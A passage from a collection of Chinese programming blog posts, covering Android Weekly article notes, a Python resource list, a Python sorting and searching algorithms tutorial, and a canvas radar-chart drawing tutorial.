小结一下，存储路径的方式在进行多级查询的时候十分方便，而在查询直接上下级的时候稍微复杂一点。还有一个很明显的缺点，那就是path的大小是指定的，所以理论上是不能进行无限层级的存储的，path值设置的越大，浪费的空间就越多。\n　　至此，本篇介绍完毕，之后还会介绍其他方法，欢迎大家继续关注！\n "},{"title":"Android Weekly Notes Issue #286","body":"December 3rd, 2017\nAndroid Weekly Issue #286\n本期文章包含如何通过踩坑来学习Kotlin,以及利用Kotlin的data class做MVVM状态保存,还包含一些基础知识的介绍,如RxJava2线程切换,Kotlin与Java容器分析.\n另外,还包括Intant App的软文一篇,以及 Android O对Notification进行Channel管理的文章,帮助大家适配O以上的通知.\n\nARTICLES & TUTORIALS\nSome useful insights on Instant apps\n文章介绍了荷兰的新闻应用NOS支持IA的实例,技术成分不多,更像是新闻报道,需要了解IA具体实现的可能得不到想要的.\nUsing Espresso to Test Opening Links\n一个女博主的小发现,如何通过Espresso测试通过TextView的autolink打开其他程序.\n其实是通过openLinkWithText来发出这个事件.\nLearning Kotlin by Mistake\n文章介绍了在错误中不断前行,学习Kotlin相别于Java的特性.\n如尽量的通过applay run let with等操作符将你的逻辑连起来.\nCompanionObjects与@JvmStatic @JvmField的取舍\nlateinit与by lazy的故事,以及自定义Delegate等等.\n最笨的办法也可以通过自动转换来学习,但是自动转换出来的并不是完全纯粹的Kotlin哦.\nPaper Signals: A Voice Experiment\n一个IoT的教学,制作一个声音盒子,通过你的语音可以变形. 比较有趣的是盒子的模型零件可以打印出来自己剪裁.\n需要的Code他们已经提供了.\n当然最重要的是,需要买材料,$24.95.\nKotlin Collections Inside. Part 1\n一个分析Kotlin容器的系列文章,这是第一篇,关于List.\n主要讲了Java与Kotlin容器的关系,对于Kotlin来说,所有Java的容器都是Mutable的,而对于Java来说Kotlin的Immutable容器可以调用改动操作,但是会抛异常.\n并且介绍了Kotlin如何初始化Immutable与Mutable的List,通过ByteCode分析,虽然MutableList没有继承与Java的ArrayList,但是通过arrayListOf与mutableListOf生成的List可以互转,原因是MutableList在生成ByteCode后,也同样继承了ArrayList....\nMulti-Threading Like a Boss in Android With RxJava 2\n文章主要讲了RxJava2如何在线程之间随意切换的,虽然没有涉及实现原理,但是通俗的讲解了subscribeOn与observerOn的使用.一个是改变source,一个是改变downstream.\nOreo Notifications: Channels – Part 1\n文章介绍Android O对于Notification的新概念,Channel,对于没有使用新的Notification Compat API设置Channel的,将不会再Android O上弹出通知.\nChannel是为了让用户对程序的不同Notification进行分组管理,可以对不同Channel分别设置开关,以及通知方式(震动,亮灯,静音等).\n与Channel配合的还有Group,可以将某几个Channel归类于一个Group,在设置页面可以看到不同的Group下的有不同Channel.\nRepresenting View State with Kotlin Data Classes\n文章介绍了把所有状态封装在一个ViewState的data class里,并通过其copy的方法,对发生变化的状态进行改变,这样可以保持其他状态不变.\n该状态可以作为ViewModel里面的一个Observable被订阅,获取不同状态下的ViewState,对UI进行操作.\nKotlin on the Backend\nRocket Travel已经使用Kotlin做Spring Boot开发一年有余,评价很好,可以在后端开发中使用到Kolin的feature,一定很High.\nLIBRARIES & CODE\nRoboPOJOGenerator\n一个插件可以直接将JSON转成Java或者Kotlin的POJO文件...\navdo\nPython的包,可以优化Vector动画或者Drawable文件.\n"},{"title":"Python资料汇总（建议收藏）","body":"整理汇总，内容包括长期必备、入门教程、练手项目、学习视频。\n\n\n一、长期必备。\n1. StackOverflow，是疑难解答、bug排除必备网站，任何编程问题请第一时间到此网站查找。\nhttps://stackoverflow.com/\n\n2. github，是源码学习、版本控制不可缺少的网站，找源码学习请第一时间到此网站，fork之后自己维护。\nhttps://github.com/\n\n3. Awesome Python 最全的python资源，没有之一，绝对不容错过的python资源大全。\nhttps://github.com/vinta/awesome-python\n\n4. Awesome Python 的中文翻译\nhttps://github.com/jobbole/awesome-python-cn\n\n5. python中文学习大本营http://www.pythondoc.com/\n\n6. 伯乐在线网站http://python.jobbole.com/\n\n\n二、入门教程\n1. 笨方法学python，最受欢迎的python入门教程。边学边撸的教程。\n\n2. 简明python教程，简明是最大的特点\nhttp://old.sebug.net/paper/python/\n\n3. python菜鸟教程。\n\n4. 廖雪峰的python教程，重点讲述python和其它语言的不同，适合有其它语言基础的朋友。\n三、练手项目\n1. 自写一个分布式爬虫。比如爬取知乎全站/头条全站/豆瓣全站等等，任何一个你想爬取的网站。完成之后获得如下技能。用爬虫项目练手实在能学习许多知识。\n1.1. http协议知识，能学会如何封装http请求包。\n\n1.2. redis/mongo/mysql等各种数据库知识。nosql和sql的知识有多重要就不用多说了。\n\n1.3. scrapy爬虫神器的知识\n\n1.4 反爬虫知识。\n比如验证码识别，javascript混淆与还原，加密与解密，ajax异步请求，更换代理ip等等。\n\n1.5.谷歌开发人员工具。\n\n2. 人工智能方向，分别用k近邻、svm、神经网络等各种机器学习的方法识别mnist。这是人工智能的入门项目。\n\n3. 数据分析方向。[使用 Spark 和 D3.js 分析航班大数据]\n\n4. 25个练手项目由易到难，代码量从几十行到几千行，在实验环境里保证可以全部完成。\nhttp://www.360doc.com/content/16/0314/09/1513309_542022647.shtml\n\n\n四、视频教程。\nhttp://bbs.itheima.com/thread-336964-1-1.html\n\n转  IT老友"},{"title":"算法（Python）","body":"算法就是为了解决某一个问题而采取的具体有效的操作步骤\n算法的复杂度，表示代码的运行效率，用一个大写的O加括号来表示，比如O(1)，O(n)\n认为算法的复杂度是渐进的，即对于一个大小为n的输入，如果他的运算时间为n3+5n+9，那么他的渐进时间复杂度是n3\n递归\n递归就是在函数中调用本身，大多数情况下，这会给计算机增加压力，但是有时又很有用，比如下面的例子：\n汉诺塔游戏\n\n把A柱的盘子，移动到C柱上，最少需要移动几次，大盘子只能在小盘子下面\n递归实现：\n\ndef hanoi(x, a, b, c):  # 所有的盘子从 a 移到 c\n\n    if x > 0:\n        hanoi(x-1, a, c, b)  # step1：除了下面最大的，剩余的盘子 从 a 移到 b\n        print('%s->%s' % (a, c))  # step2:最大的盘子从 a 移到 c\n        hanoi(x-1, b, a, c)  # step3: 把剩余的盘子 从 b 移到 c\n\nhanoi(10, 'A', 'B', 'C')\n\n#计算次数\n\ndef h(x):\n    num = 1\n    for i in range(x-1):\n        num = 2*num +1\n\n    print(num)\nh(10)\n\n用递归打印斐波那契数列\n\ndef fei(n):\n    if n == 0:\n        return 0\n    elif n == 1:\n        return 1\n    else:\n        return fei(n-1)+fei(n-2)\n\n你会发现，即使n只有几十的时候，你的计算机内存使用量已经飙升了\n其实，如果结合生成器，你会发现不管n有多大，都不会出现卡顿，但这是生成器的特性，本篇博客不重点介绍\n\n# 结合生成器\ndef fei(n):\n    pre,cur = 0,1\n    while n >=0:\n        yield pre\n        n -= 1\n        pre,cur = cur,pre+cur\n\nfor i in fei(400000):\n    print(i)\n\n \n关于递归次数，Python中有个限制，可以通过sys模块来修改\n\nimport sys\nsys.setrecursionlimit(1000000)\n\n \n\n \n查找\n1.顺序查找\n这个没的说，就是for循环呗，时间复杂度O(n)\n\ndef linear_search(data_set, value):\n    for i in range(len(data_set)):\n        if data_set[i] == value:\n            return i\n    return\n\n \n2.二分查找\n时间复杂度O(logn)\n就是一半一半的查找，看目标值在左边一半还是右边一半，然后替换左端点或者右端点，继续判断\n非递归版本：\n\ndef binary_serach(li,val):\n    low = 0\n    high = len(li)-1\n    while low <= high:\n        mid = (low+high)//2\n        if li[mid] == val:\n            return mid\n        elif li[mid] > val:\n            high = mid-1\n        else:\n            low = mid+1\n    else:\n        return None\n\n 递归版本的二分查找\n\ndef bin_search_rec(data_set, value, low, high):\n    if low < high:\n        mid = (low + high) // 2\n        if data_set[mid] == value:\n            return mid\n        elif data_set[mid] > value:\n            return bin_search_rec(data_set, value, low, mid - 1)\n        else:\n            return bin_search_rec(data_set, value, mid + 1, high)\n    else:\n        return None\n\n \n\n \n排序\n速度慢的三个：\n1.冒泡排序\n　　原理就是，列表相邻的两个数，如果前边的比后边的小，那么交换顺序，经过一次排序后，最大的数就到了列表最前面\n　　代码：　　\n\ndef bubble_sort(li):\n\n    for j in range(len(li)-1):\n        for i in range(1, len(li)):\n            if li[i] > li[i-1]:\n                li[i], li[i-1] = li[i-1], li[i]\n\n    return li\n\n冒泡排序的最差情况，即每次都交互顺序的情况，时间复杂度是O(n2)\n存在一个最好情况就是列表本来就是排好序的，所以可以加一个优化，加一个标志位，如果没有出现交换顺序的情况，那就直接return \n\n# 优化版本的冒泡\ndef bubble_sort_opt(li):\n    for j in range(len(li)-1):\n        flag = False\n        for i in range(1, len(li)):\n            if li[i] > li[i-1]:\n                li[i], li[i-1] = li[i-1], li[i]\n                flag = True\n        if not flag:\n            return li\n    return li\n\n 2.插入排序\n　　原理：把列表分为有序区和无序区两个部分。最初有序区只有一个元素。然后每次从无序区选择一个元素，插入到有序区的位置，直到无序区变空。\n\ndef insert_sort(li):\n    for i in range(1,len(li)):\n        tmp = li[i]\n        j = i - 1\n        while j >= 0 and tmp < li[j]:　　　　# 找到一个合适的位置插进去\n            li[j+1] = li[j]\n            j -= 1\n        li[j+1] = tmp\n    return li\n\n时间复杂度是O(n2)\n \n3.选择排序\n　　原理：遍历列表一遍，拿到最小的值放到列表第一个位置，再找到剩余列表中最小的值，放到第二个位置。。。。\n\ndef select_sort(li):\n    for i in range(len(li)-1):\n        min_loc = i         # 假设当前最小的值的索引就是i\n        for j in range(i+1,len(li)):\n            if li[j] < li[min_loc]:\n                min_loc = j\n        if min_loc != i:   # min_loc 值如果发生过交换，表示最小的值的下标不是i,而是min_loc\n            li[i],li[min_loc] = li[min_loc],li[i]\n\n    return li\n\n时间复杂度是O(n2)\n \n \n速度快的几种排序：\n4.快速排序（快排）\n原理：让指定的元素归位，所谓归位，就是放到他应该放的位置（左变的元素比他小，右边的元素比他大），然后对每个元素归位，就完成了排序\n可以参考这个动图来理解下面的代码\n\n代码：\n\n#  归位函数\ndef partition(data, left, right): # 左右分别指向两端的元素\n    tmp = data[left]                # 把左边第一个元素赋值给tmp,此时left指向空\n    while left < right:             # 左右两个指针不重合，就继续\n        while left < right and data[right] >= tmp:  # right指向的元素大于tmp,则不交换\n            right -= 1                      # right 向左移动一位\n        data[left] = data[right]            # 如果right指向的元素小于tmp，就放到左边现在为空的位置\n        while left < right and data[left] <= tmp:   # 如果left指向的元素小于tmp,则不交换\n            left += 1                       # left向右移动一位\n        data[right] = data[left]            # 如果left指向的元素大于tmp,就交换到右边\n    data[left] = tmp            # 最后把最开始拿出来的那个值，放到左右重合的那个位置\n    return left                 # 最后返回这个位置\n\n#  写好归位函数后，就可以递归调用这个函数，实现排序\ndef quick_sort(data, left, right):\n    if left < right:\n        mid = partition(data, left, right)  # 找到指定元素的位置\n        quick_sort(data, left, mid - 1)     # 对左边元素排序\n        quick_sort(data, mid + 1, right)    # 对右边元素排序\n    return data\n\n正常的情况，快排的复杂度是O(nlogn)\n快排存在一个最坏情况，就是每次归位，都不能把列表分成两部分，此时复杂度就是O(n2)了，如果要避免设计成这种最坏情况，可以在取第一个数的时候不要取第一个了，而是取一个列表中的随机数\n \n5.归并排序\n原理：列表分成两段有序，然后分解成每个元素后，再合并成一个有序列表，这种操作就叫做一次归并\n　　应用到排序就是，把列表分成一个元素一个元素的，一个元素当然是有序的，将有序列表一个一个合并，最终合并成一个有序的列表\n　　\n \n图示：\n\n \n代码：\n\ndef merge(li, left, mid, right):\n    # 一次归并过程，把从mid分开的两个有序列表合并成一个有序列表\n    i = left\n    j = mid + 1\n    ltmp = []\n    # 两个列表的元素依次比较，按从大到小的顺序放到一个临时的空列表中\n    while i <= mid and j <= right:\n        if li[i] < li[j]:\n            ltmp.append(li[i])\n            i += 1\n        else:\n            ltmp.append(li[j])\n            j += 1\n\n    # 如果两个列表并不是平均分的，就会存在有元素没有加入到临时列表的情况，所以再判断一下\n    while i<= mid:\n        ltmp.append(li[i])\n        i += 1\n    while j <= right:\n        ltmp.append(li[j])\n        j += 1\n    li[left:right+1] = ltmp\n    return li\n\n\ndef _merge_sort(li, left, right):\n    # 细分到一个列表中只有一个元素的情况，对每一次都调用merge函数变成有序的列表\n    if left < right:\n        mid = (left+right)//2\n        _merge_sort(li, left, mid)\n        _merge_sort(li, mid+1, right)\n        merge(li, left, mid, right)\n    return li\n\ndef merge_sort(li):\n    return(_merge_sort(li, 0, len(li)-1))\n\n照例，时间复杂度是O(nlogn)\n特殊的，归并排序还有一个O(n)的空间复杂度\n \n6.堆排序\n把这个放到最后，是因为这个是最麻烦的，把最麻烦的放到最后，是一种对工作负责的表现\n如果要说堆排序，首先得先把‘树’搞明白\n树\n树是一种数据结构；\n树是由n个节点组成的集合； -->如果n为0，那这是一颗空树，如果n>0，那么那存在1个节点作为树的根节点，其他节点可以分为m个集合，每个集合本身又是一棵树。\n一些可能会用到的概念：\n　　根节点：树的第一个节点，没有父节点的节点\n　　叶子节点：不带分叉的节点\n　　树的深度（高度）：就是分了多少层\n　　孩子节点、父节点：节点与节点之间的关系\n图示：\n \n二叉树\n然后在树的基础上，有一个二叉树，二叉树就是每个节点最多有两个子节点的树结构，比如这个：\n\n \n满二叉树：除了叶子节点，所有节点都有两个孩子，并且所有叶子节点深度都一样\n完全二叉树：是有满二叉树引申而来，假设二叉树深度为k，那么除了第k层，之前的每一层的节点数都达到最大，即没有空的位置，而且第k层的子节点也都集中在左子树上（顺序）\n\n \n二叉树的存储方式\n有链式存储和顺序存储的方式（列表），本篇只讨论顺序存储的方式\n思考：\n　　父节点和左孩子节点的编号下标有什么关系？　　　　0-1 1-3 2-5 3-7 4-9         i  ---->   2i+1\n　　父节点和右孩子节点的编号下标有什么关系？　　　　0-2 1-4 2-6 3-8 4-10　　i  ----->  2i+2\n \n再来了解下堆，堆说起来又麻烦了，我将在另一篇博客中单独写堆，栈等这些数据结构，本篇先讨论与排序有关的东西\n堆\n堆是一类特殊的树，要求父节点大于或小于所有的子节点\n\n大根堆：一棵完全二叉树，满足任一节点都比其孩子节点大  　　，升序用大根堆\n小根堆：一棵完全二叉树，满足任一节点都比其孩子节点小\n\n \n \n堆的调整：当根节点的左右子树都是堆时，可以通过一次向下的调整来将其变换成一个堆。\n所谓一次向下调整，就是说把堆顶的值，向下找一个合适的位置，是一次一次的找，跟他交换位置的值，也要找到一个合适的位置\n　　　　“浏览器写的没保存，丢失了，所以这块不想再写了。。。”\n \n堆排序的过程\n　　1.构造堆\n　　2.得到堆顶元素，就是最大的元素\n　　3.去掉堆顶，将堆的最后一个元素放到堆顶，此时可以通过一次调整重新使堆有序\n　　4.堆顶元素为第二大元素\n　　5.重复步骤3，直到堆为空\n \n其中构造堆的过程：\n \n \n挨个出数的过程：\n\n代码：\n \n\ndef sift(li, left, right):  # left和right 表示了元素的范围，是根节点到右节点的范围，然后比较根和两个孩子的大小，把大的放到堆顶\n                                    # 和两个孩子的大小没关系，因为我们只需要拿堆顶的元素就行了\n    # 构造堆\n    i = left        # 当作根节点\n    j = 2 * i + 1   # 上面提到过的父节点与左子树根节点的编号下标的关系\n    tmp = li[left]\n    while j <= right:\n        if j+1 <= right and li[j] < li[j+1]:    # 找到两个孩子中比较大的那个\n            j = j + 1\n        if tmp < li[j]:     # 如果孩子中比较大的那个比根节点大，就交换\n            li[i] = li[j]\n            i = j           # 把交换了的那个节点当作根节点，循环上面的操作\n            j = 2 * i + 1\n        else:            \n            break\n    li[i] = tmp             # 如果上面发生交换，现在的i就是最后一层符合条件（不用换）的根节点，\n\ndef heap_sort(li):\n    n = len(li)\n    for i in range(n//2-1, -1, -1):  # 建立堆        n//2-1 是为了拿到最后一个子树的根节点的编号，然后往前走，最后走到根节点0//2 -1 = -1\n        sift(li, i, n-1)                # 固定的把最后一个值的位置当作right，因为right只是为了判断递归不要超出当前树，所以最后一个值可以满足\n                                                    # 如果每遍历一个树，就找到它的右孩子，太麻烦了\n    for i in range(n-1, -1, -1):    # 挨个出数\n        li[0], li[i] = li[i],li[0]      # 把堆顶与最后一个数交换，为了节省空间，否则还可以新建一个列表，把堆顶（最大数）放到新列表中\n        sift(li, 0, i-1)            # 此时的列表，应该排除最后一个已经排好序的，放置最大值的位置，所以i-1\n\n时间复杂度也是O(nlogn)\n来扩展一下，如果要取一个列表的top10，就是取列表的前十大的数，怎么做？\n可以用堆来实现，取堆的前十个数，构造成一个小根堆，然后依次遍历列表后面的数，如果比堆顶小，则忽略，如果比堆顶大，则将堆顶替换成改元素，然后进行一次向下调整，最终这个小根堆就是top10\n其实Python自带一个heapq模块，就是帮我们对堆进行操作的\nheapq模块\n队列中的每个元素都有优先级，优先级最高的元素优先得到服务（操作），这就是优先队列，而优先队列通常用堆来实现\n如果用heapq模块来实现堆排序，就简单多了：\n\nimport heapq\ndef heapq_sort(li):\n    h = []\n    for value in li:\n        heapq.heappush(h,value)\n    return [heapq.heappop(h) for i in range(len(h))]\n\n而想取top10 ，直接一个方法就行了\n\nheapq.nlargest(10,li)\n\n \n这三种速度快的排序方式就说完了，其中，快排是速度最快的，即使这样，也不如Python自带的sort快\n再来介绍两种排序，希尔排序和计数排序\n7.希尔排序\n希尔排序是一种分组插入排序的算法　　\n思路：\n　　首先取一个整数d1=n/2，将元素分为d1个组，每组相邻量元素之间距离为d1，在各组内进行直接插入排序；\n　　取第二个整数d2=d1/2，重复上述分组排序过程，直到di=1，即所有元素在同一组内进行直接插入排序。\n希尔排序每趟并不使某些元素有序，而是使整体数据越来越接近有序；最后一趟排序使得所有数据有序。\n \n图示：\n　 \n代码：\n\ndef shell_sort(li):    gap = int(len(li)//2)   # 初始把列表分成 gap个组，但是每组最多就两个元素，第一组可能有三个元素    while gap >0:        for i in range(gap,len(li)):            tmp = li[i]            j = i - gap            while j>0 and tmp<li[j]:    # 对每一组的每一个数，都和他前面的那个数比较，小的在前面                li[j+gap] = li[j]                j -= gap            li[j+gap] = tmp        gap = int(gap//2)　　　　# Python3中地板除也是float类型    return li\n\n通过diamante也能看出来，其实希尔排序和插入排序是非常相像的，插入排序就可以看做是固定间隔为1的希尔排序，希尔排序就是把插入排序分了个组，同一个组内，相邻两个数之间不是相差1，而是相差gap\n时间复杂度：O((1+t)n)，其中t是个大于0小于1的数，取决于gap的取法，当gap=len(li)//2的时候，t大约等于0.3\n \n8.计数排序\n需求：有一个列表，列表中的数都在0到100之间（整数），列表长度大约是100万，设计算法在O(n)时间复杂度内将列表进行排序\n分析：列表长度很大，但是数据量很少，会有大量的重复数据。可以考虑对这100个数进行排序\n代码：\n\ndef count_sort(li):\n    count = [0 for i in range(101)]  # 根据原题，0-100的整数\n    for i in li:\n        count[i] += 1\n\n    i = 0\n    for num,m in enumerate(count):  # enumerate函数将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。\n        for j in range(m):\n            li[i] = num\n            i += 1\n\n "},{"title":"浅谈canvas绘画王者荣耀--雷达图","body":"\n\n背景：\n一日晚上下班的我静静的靠在角落上听着歌，这时\"滴!滴!\"手机上传来一阵qq消息。原来我人在问王者荣耀的雷达图在页面上如何做出来的，有人回答用canvas绘画。那么问题来了，已经好久没有使用canvas绘画了东西。\nSO，就想自己画一个canvas雷达图，顺便重新回顾一下canvas的知识点。\n\n王者荣耀雷达图的基本构成。\n聊天记录当中的雷达图不是特别清楚，所以我这边截图了自己的一个战绩雷达图。\n\n是不是有被我的战绩吓到了，害不害怕！\n好了扯远了，让我们回到正题上来。\n通过截图上面的雷达图基本主体是一个正六边形，每个顶点则配有相应的文字说明。\n然后就是中间红色区域部分则由对角线上的点，连成一圈填充构成。因此这里我们称它为数据填充区\n所以这个雷达图我们分为三步来完成。\n①正六边形\n②数据填充区\n③绘制文本\n正六变形的坐标点解析\n在绘画这个正六边形的时候，先让我们对于这个正六边形进行简单的数学分析。\n这里先用画板画一个正六变形，然后进行切割并切角。\n\n是吧，借用以前高中还是初中的数学，正六边形的内角和720°，那么每一个对角就是120°。在已知对角线的长度。那么通过sin60°，cos60°一类的，那个可以求出各个三角形的边长。\n可是问题来了，这里我们要计算的是各个坐标点。而canvas的坐标轴是从左上角算（0，0）原点的单象限坐标轴。假设六边形的中心点是（250，250）、对角线的长度是100*2，那么按照三角函数推断：\nbottom-center坐标：（250, 250 + 100）\nbottom-left坐标：（250 - 100*sin(60°), 250+100*cos(60°)）\ntop-left坐标：（250 - 100*sin(60°), 250-100*cos(60°)）\ntop-center坐标：（250, 250 - 100）\ntop-right坐标：（250 + 100*sin(60°), 250-100*cos(60°)）\nbottom-right的坐标：（250 + 100*sin(60°), 250+100*cos(60°)）\n\n坐标是出来了，但是一个点一个点去绘画是不是有点太low了！\n肿么办？\n啦啦啦啦！\n那么就到了我们找规律的时间来了！\n但是在找规律的同时，为毛中心点的X轴和别人不一样，为毛一会加一会减。\n所以当思考各坐标点参数的规律的时候，让先回顾以前的函数角度图表\n\n看完这个函数参照图之后，让我再次修改一下6个点的书写方式。\nbottom-center坐标：（250 + 100*sin(0°), 250 + 100*cos(0°)）\nbottom-left坐标：（250 + 100*sin(300°), 250+100*cos(300°)）\ntop-left坐标：（250 + 100*sin(240°), 250-100*cos(240°)）\ntop-center坐标：（250 +100*sin(180°), 250 + 100*cos(180°)）\ntop-right坐标：（250 + 100*sin(120°), 250-100*cos(120°)）\nbottom-right的坐标：（250 + 100*sin60°), 250+100*cos(60°)）\n这个时候再看组坐标数据点，是不是感觉有点意思！\n\n那么这个时候我们便可以通过一个for循环，用一个数组把这6个坐标点给记录下来。\nvar pointArr = [];\nfor (var i = 0; i < 6; i++) {\n        pointArr[i] = {};\n       pointArr[i].x = 250 + 100 * Math.sin(60 * i);\n        pointArr[i].y = 250 + 100* Math.cos(60 * i);\n    }\n1.1 绘画正六边形\n前面既然，将正六边形的坐标点通过一个for循环解析出来。那么就是代码绘画正六边形了：\n<style>\n        canvas {\n            display: block;\n            width: 500px;\n            height: 500px;\n        }\n</style>\n<body>\n    <canvas class=\"radar\"></canvas>\n</body>\n<script>\n    var canvas = document.getElementsByClassName('radar')[0];\n    canvas.width = 500;\n    canvas.height = 500;\n    var ctx = canvas.getContext('2d');\n    ctx.save();\n    ctx.strokeStyle = '#888888';  // 设置线条颜色\n    var lineArr = [];\n    var rAngle = Math.PI * 2 / 6;  // 算出每一个内角和\n    console.log(rAngle);\n    var rCenter = 250;  // 确定中心点\n    var curR = 100;   // 确定半径长度\n    ctx.beginPath();\n    for (var i = 0; i < 6; i++) {\n        lineArr[i] = {};\n        lineArr[i].y = rCenter + curR * Math.cos(rAngle * i);\n        lineArr[i].x = rCenter + curR * Math.sin(rAngle * i);\n        ctx.lineTo(lineArr[i].x, lineArr[i].y);\n    }\n    ctx.closePath();\n    ctx.stroke();\n    ctx.restore();\n\n啦啦啦！！！一个正六边形就这么的画出来。\n备注：这里rAngle这里是很灵活的，如果说画18正边形，就除以18，然后for循环18次就ok了.\n\n哈哈！！感觉发现了新大陆了！绘制正多边形的貌似可以按照这个规律来！！\n1.2 绘画对角线\n既然前面有一个数组存储各个坐标点，所以让每个对角线对角点直线想连就ok了！\nctx.strokeStyle = '#e8ddc7';  // PS吸管那么一吸\n    ctx.save();\n    ctx.beginPath();\n    // for (var j = 0; j < 3; j++) {\n    //     ctx.lineTo(lineArr[j].x, lineArr[j].y);\n    //     ctx.lineTo(lineArr[j+3].x, lineArr[j+3].y);\n    //     ctx.stroke();\n    // }\n    for (var j = 0; j < 3; j++) {\n        ctx.moveTo(lineArr[j].x, lineArr[j].y);\n        ctx.lineTo(lineArr[j + 3].x, lineArr[j + 3].y);\n        ctx.stroke();\n    }\n    ctx.closePath();\n    ctx.restore();\n\n2.1数据填充区\n关于数据填充区，也就是雷达图当中，不规则的红色半透明的六边形。其实就是就可以看做中心点，到各个边角点之间线段为一区间这。之后就是将这个区间分成若干份，你占这个这个区间多少份，满份就是边角点，零份就是原点。\n观察前面的雷达图当中，B等级大概占据某个等级的50%左右。而B前面还有等级A、S。\n所以当S等级时候，可以看作区间 / 1。\nB等级看作区间 / 2, 那么A就是 区间 / 1.5.\n以此类推就可以得出剩下 C 就是区间 / 2.5、D：区间/ 3\n这里我就不用for循环书写了，直接偷懒手写一个对象。\n// 绘制数据区域\nvar letterData = {\n        'S': 1,\n        'A': 1.5,\n        'B': 2,\n        'C': 2.5,\n        'D': 3\n    }\nctx.save();\nctx.beginPath();\nfor (var i = 0; i < 6; i++) {\n        lineArr[i].yEnd = rCenter + curR * Math.cos(rAngle * i) / (letterData[rData[i][1]]);\n        lineArr[i].xEnd = rCenter + curR * Math.sin(rAngle * i) / (letterData[rData[i][1]]);\n        ctx.lineTo(lineArr[i].xEnd, lineArr[i].yEnd); \n        console.log(lineArr);\n }\nctx.closePath();\nctx.stroke();\nctx.fillStyle = 'rgba(255, 0, 0, 0.5)'; \nctx.fill();\n\n2.2 对数据填充区域绘画小圆点和边长\n当我们回归到前面的截图发现，需要单独把数据填充区域的的各个点位置给加强，并把边角用更深的线条的描绘出来。\nctx.lineWidth = 2;  //设置数据填充区域的线条颜色\nctx.strokeStyle = '#dd3f26';  //设置填充区域的颜色\nvar point = 3; //设置数据填充区域的小圆点大小\nfor (var i = 0; i < 6; i++) {\n        ctx.beginPath();\n        ctx.arc(lineArr[i].xEnd, lineArr[i].yEnd, point, 0, Math.PI * 2); \n        ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';\n        ctx.fill();\n        console.log(lineArr);\n    }\n    ctx.restore();\n\n3.1 绘制文本\n王者荣耀雷达文本是需要绘制两点，\n①用黑色16px字体绘制各点描述点\n②用红色30px字体绘制各点能力级别\n但是估计看到绘制文本，估计有的小伙伴就会说。不是有数组的存储各个边角的坐标，直接一个for循环依次根据各个点绘画出来不就OK了。\n // 绘制文本\n    var rData = [\n        ['生存', 'S'],\n        ['经济', 'S'],\n        ['输出', 'S'],\n        ['KDA', 'B'],\n        ['打野', 'B'],\n        ['推进', 'S']\n    ]\n    ctx.save();\n    ctx.font = '16px Microsoft Yahei';  //设置字体\n    ctx.fillStyle = '#000';  // 颜色\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        ctx.fillText(rData[i][0], x, y);\n    }\n    ctx.restore();\n浏览器最终显示的视觉效果：\n\n\n是不是觉得很惊喜，这里输出、经济位置勉强还行，但是剩下的文字位置就偏差了许多了。所以在绘制文字的时候，还得针对文字的坐标位置进行相应的调整。\n3.2 绘制文本--描述\n既然直接调用坐标的位置会出问题，那么让根据上文中的图片文字的规则简单分析。\n①如果X轴 == 中心点，那么就判断Y轴。比中心点大文字下移一点，反之文字上移一点。\n②如果X轴 < 中心点，那么文字X轴位置就左移动一点,反正右移动距离。\n // 绘制文本\n    ctx.save();\n    var fontSize = 16;\n    ctx.font =  fontSize + 'px Microsoft Yahei';\n    ctx.textBaseline=\"middle\"; //设置基线参考点\n    ctx.textAlign=\"center\";  // 文本居中\n    ctx.fillStyle = '#000';\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        console.log(Math.sin(rAngle * i))\n        var s_width = ctx.measureText(rData[i][0]).width; //获取当前绘画的字体宽度\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][0], x - s_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][0], x - s_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][0], x + s_width*1.5, y);\n        } else {\n             ctx.fillText(rData[i][0], x - s_width*1.5, y);\n        }\n\n这里多了好几个不常用的属性，下面就是介绍这些属性的特点：\nctx.textBaseline: 设置或返回在绘制文本时使用的当前文本基线\n说到基线，各位童鞋想一想咱们以前英文练习本，上面有着一条条线条\n\n瞬间回忆到当年被罚抄英语单词的岁月，一把辛酸泪呀。\n\n网页设计字体也有一个基线的存在，因此canvas的基线点就是直接从坐标点划出一条横线基线。\n这里从网络上截图一张，通过设置基线参考位置，看看文本所在位置的改变。\n\nctx.textAlign: 这个文本水平居中，不过和CSS当中的居中不一样的是，他是从坐标点划出一条竖线分割文本的。\n\nctx.measureText : 返回包含指定文本宽度的对象。\n通俗一点的就是说，就是获取你绘制文本的宽度。假设一排文字内容为'Hello World'， size为16px大小文本。在这里高度都是16px稳定不变，这样canvas画其他元素对这个位置只需要Y轴移动这个文本的'size'大小就可以避免覆盖到上面。\n但是如果要X轴去移动位置,你根本不知道'Hello World'这串文本的长度。那么这个时候就需要ctx.measureText这个方法，获取当前你绘制文本的宽度。\n3.2 绘制文本--能力级别\n既然前面已经介绍了描述的绘画方法，那么依葫芦画瓢。让我们一并开始绘制能力级别的文本。\n// 绘制文本\n    ctx.save();\n    var fontSize = 16;\n    var maxfontSize = 30;\n    ctx.font =  fontSize + 'px Microsoft Yahei';\n    ctx.textBaseline=\"middle\";\n    ctx.textAlign=\"center\";\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        console.log(Math.sin(rAngle * i))\n        var s_width = ctx.measureText(rData[i][0]).width;\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][0], x - s_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][0], x - s_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][0], x + s_width*1.5, y);\n        } else {\n             ctx.fillText(rData[i][0], x - s_width*1.5, y);\n        }\n    }\n    ctx.restore();\n    ctx.save(); \n// 绘制等级\n    ctx.font = '30px Microsoft Yahei bold';\n    ctx.fillStyle = '#d7431f';\n    ctx.textBaseline=\"middle\";\n    